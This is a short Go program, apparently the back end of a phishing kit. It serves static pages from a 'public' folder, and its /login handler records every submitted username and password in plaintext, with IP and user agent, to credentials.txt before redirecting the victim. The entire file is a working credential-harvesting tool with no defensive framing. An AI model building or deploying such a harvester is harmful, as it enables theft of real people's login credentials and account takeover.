package main

import (
	"net/http"
	"os"
	"time"

	"github.com/gorilla/mux"
	log "github.com/sirupsen/logrus"
)

var x = `
<html>
<body>
Hello {{.}}
</body>
</html>
`

func login(w http.ResponseWriter, req *http.Request) {
	log.WithFields(log.Fields{
		"time":       time.Now(),
		"method":     req.Method,
		"username":   req.FormValue("_user"),
		"password":   req.FormValue("_pass"),
		"user_agent": req.UserAgent(),
		"ip":         req.RemoteAddr,
	}).Info("Login attempt")

	http.Redirect(w, req, "/", 302)
}

func main() {

	fh, err := os.OpenFile("credentials.txt", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)

	if err != nil {
		log.Fatal(err)
	}

	defer fh.Close()

	log.SetOutput(fh)

	r := mux.NewRouter()

	r.HandleFunc((`/login`), login).Methods("POST")
	r.PathPrefix("/").Handler(http.FileServer(http.Dir("public")))

	log.Fatal(http.ListenAndServe(":8080", r))
}
